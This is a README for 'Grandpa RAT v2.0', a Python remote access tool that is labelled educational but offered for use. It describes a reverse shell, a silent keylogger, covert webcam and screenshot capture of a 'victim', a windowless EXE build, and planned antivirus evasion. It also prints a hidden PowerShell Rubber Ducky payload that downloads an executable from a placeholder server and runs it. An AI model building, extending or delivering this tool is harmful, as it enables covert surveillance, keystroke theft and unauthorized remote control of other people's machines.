📘 README.md
markdown
Copy
Edit
# 👴 Grandpa RAT v2.0 - Remote Access Tool (Educational)

**Grandpa RAT v2.0** is a modular Remote Access Tool (RAT) built in Python for educational and ethical hacking labs. This tool enables secure remote administration, basic surveillance, and command execution through a stealth client-server setup with both GUI and terminal-based controllers.

> ⚠️ **Educational Use Only.** Do not deploy on unauthorized systems. Built for testing in controlled environments such as VMs or cybersecurity labs.

---

## 🧠 Features

| Feature                        | Description                                     |
|-------------------------------|-------------------------------------------------|
| 🔁 Reverse Shell              | Execute remote shell commands on the victim    |
| 🔐 Password Protection        | Secure client-server communication             |
| 📷 Screenshot Capture         | Take and retrieve desktop screenshots          |
| 🎥 Webcam Snapshot            | Capture image from victim’s webcam             |
| ⌨️ Keylogger                 | Log keystrokes silently in the background      |
| 🧠 GUI Controller             | Intuitive Tkinter-based interface              |
| 🖥️ Terminal Controller       | Optional command-line controller               |
| 💉 Rubber Ducky Payload       | USB attack script for automatic delivery       |
| 🔧 Obfuscation (WIP)          | Placeholder for EXE stealth & encryption       |

---

## 📂 Project Structure

GrandpaRAT-v2.0/ ├── client/ # RAT client scripts (keylogger, webcam, shell) ├── server/ # GUI & CLI controllers ├── delivery/ # USB-based rubber ducky payload ├── build_tools/ # Obfuscation & EXE builder (to be added) ├── README.md # This documentation └── .gitignore # Git exclusions

yaml
Copy
Edit

---

## 🚀 Getting Started

### 📦 Dependencies

```bash
pip install pyautogui opencv-python pynput
🧪 Usage (Test Lab Setup)
Start the GUI server (controller):

bash
Copy
Edit
cd server
python gui_controller.py
Run the RAT client (on victim or test machine):

bash
Copy
Edit
cd client
python rat_client.py
Once connected:

Type commands like whoami, screenshot, webcam, or exit

Outputs will appear in the GUI

🛠️ Build Client to .EXE
Install PyInstaller:

bash
Copy
Edit
pip install pyinstaller
Build the EXE:

bash
Copy
Edit
pyinstaller --onefile --noconsole rat_client.py
EXE will be in the /dist folder

🕵️ Obfuscation and AV evasion steps will be available in /build_tools/obfuscate.py (coming soon)

🧪 Rubber Ducky Delivery (USB)
Found in delivery/rubber_ducky_payload.txt. Load onto a Rubber Ducky or HID attack tool to automate:

powershell
Copy
Edit
powershell -w hidden -c "iwr http://yourserver/payload.exe -OutFile $env:temp\\rat.exe; Start-Process $env:temp\\rat.exe"
👨‍🔬 Legal Disclaimer
This software is intended strictly for educational purposes and authorized penetration testing.
Do not deploy on unauthorized networks or systems.
The author assumes no responsibility for misuse or damage.

🧑‍💻 Author
Matthew Ogoh – Cybersecurity Specialist & Ethical Hacker
GitHub: @grandpacltn
Twitter: @cybergrandpa__

⭐ Show Some Love
If this project helped you learn, consider giving it a ⭐ on GitHub. Let's build safer systems and smarter hackers!

